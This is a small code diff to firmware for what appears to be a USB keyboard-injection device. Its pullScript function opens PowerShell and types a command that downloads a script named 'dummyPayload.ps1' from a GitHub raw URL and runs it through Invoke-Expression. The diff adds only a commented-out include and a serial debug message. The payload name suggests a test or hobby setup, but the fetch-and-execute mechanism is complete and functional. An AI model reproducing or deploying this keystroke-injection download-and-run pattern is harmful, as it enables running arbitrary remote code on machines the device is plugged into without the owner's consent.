@@ -1,4 +1,5 @@
 #include <key.h>
+// #include <serials.h>
 
 KEYBOARD::KEYBOARD() {}
 
@@ -27,6 +28,7 @@ void KEYBOARD::pullScript() {
     KEYBOARD::openPS();
     delay(500);
     Keyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content)");
+    Serial1.println("#Roger Roger#");
 }
 
 KEYBOARD key = KEYBOARD();
